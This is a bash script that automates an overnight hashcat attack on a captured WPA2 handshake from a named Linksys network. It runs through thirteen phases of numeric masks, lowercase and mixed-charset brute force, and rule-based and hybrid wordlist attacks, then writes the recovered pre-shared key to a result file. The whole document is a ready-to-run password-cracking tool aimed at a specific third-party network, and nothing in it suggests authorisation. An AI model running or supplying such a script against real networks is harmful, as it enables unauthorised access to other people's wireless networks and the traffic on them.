#!/bin/bash
# Overnight WPA2 PSK Cracking Script
# Target: Linksys03963 handshake
# Hash: /root/data/linksys.hc22000

HASH="/root/data/linksys.hc22000"
WORDLIST="/root/data/linksys_wifi_wordlist.txt"
LOG="/root/data/crack_log.txt"
RESULT="/root/data/CRACKED.txt"

echo "=== OVERNIGHT CRACK SESSION ===" > "$LOG"
echo "Started: $(date)" >> "$LOG"
echo "Hash: $HASH" >> "$LOG"
echo "" >> "$LOG"

check_cracked() {
    local found=$(hashcat -m 22000 "$HASH" --show --force 2>/dev/null)
    if [ -n "$found" ]; then
        echo "" >> "$LOG"
        echo "!!! PSK CRACKED !!!" >> "$LOG"
        echo "$found" >> "$LOG"
        echo "Cracked at: $(date)" >> "$LOG"
        echo "$found" > "$RESULT"
        echo "CRACKED: $found"
        return 0
    fi
    return 1
}

run_attack() {
    local name="$1"
    shift
    echo "" >> "$LOG"
    echo "--- Attack: $name ---" >> "$LOG"
    echo "Start: $(date)" >> "$LOG"
    echo "Command: hashcat $@" >> "$LOG"

    hashcat "$@" --force 2>&1 | tail -20 >> "$LOG"
    local rc=$?

    echo "End: $(date), Exit: $rc" >> "$LOG"

    if check_cracked; then
        exit 0
    fi
}

# Phase 1: 8-digit all-numeric (100M candidates)
run_attack "8-digit numeric" -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d"

# Phase 2: 9-digit all-numeric (1B candidates)
run_attack "9-digit numeric" -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d?d"

# Phase 3: 10-digit all-numeric (10B candidates)
run_attack "10-digit numeric" -m 22000 -a 3 "$HASH" "?d?d?d?d?d?d?d?d?d?d"

# Phase 4: 8-char lowercase alpha (208B candidates - may take long)
run_attack "8-char lowercase" -m 22000 -a 3 "$HASH" "?l?l?l?l?l?l?l?l"

# Phase 5: dive.rule against custom Linksys wordlist (heavy mutation)
run_attack "dive.rule + linksys wordlist" -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/dive.rule

# Phase 6: d3ad0ne.rule against custom Linksys wordlist
run_attack "d3ad0ne.rule + linksys wordlist" -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/d3ad0ne.rule

# Phase 7: rockyou-30000.rule against base wordlist
run_attack "rockyou-30000.rule + linksys wordlist" -m 22000 -a 0 "$HASH" "$WORDLIST" -r /usr/share/hashcat/rules/rockyou-30000.rule

# Phase 8: Hybrid - wordlist + 4 digits appended
run_attack "hybrid wordlist+4digits" -m 22000 -a 6 "$HASH" "$WORDLIST" "?d?d?d?d"

# Phase 9: Hybrid - 4 digits prepended + wordlist
run_attack "hybrid 4digits+wordlist" -m 22000 -a 7 "$HASH" "?d?d?d?d" "$WORDLIST"

# Phase 10: Custom charset - lowercase + digits, 8 chars
run_attack "8-char lower+digit" -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1"

# Phase 11: Custom charset - lowercase + digits, 9 chars
run_attack "9-char lower+digit" -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1?1"

# Phase 12: Custom charset - lowercase + digits, 10 chars
run_attack "10-char lower+digit" -m 22000 -a 3 "$HASH" -1 "?l?d" "?1?1?1?1?1?1?1?1?1?1"

# Phase 13: Mixed case + digits, 8 chars
run_attack "8-char mixed+digit" -m 22000 -a 3 "$HASH" -1 "?l?u?d" "?1?1?1?1?1?1?1?1"

# Final check
echo "" >> "$LOG"
echo "=== ALL ATTACKS COMPLETE ===" >> "$LOG"
echo "Finished: $(date)" >> "$LOG"
if ! check_cracked; then
    echo "PSK NOT FOUND in any attack phase." >> "$LOG"
    echo "NOT CRACKED" > "$RESULT"
fi
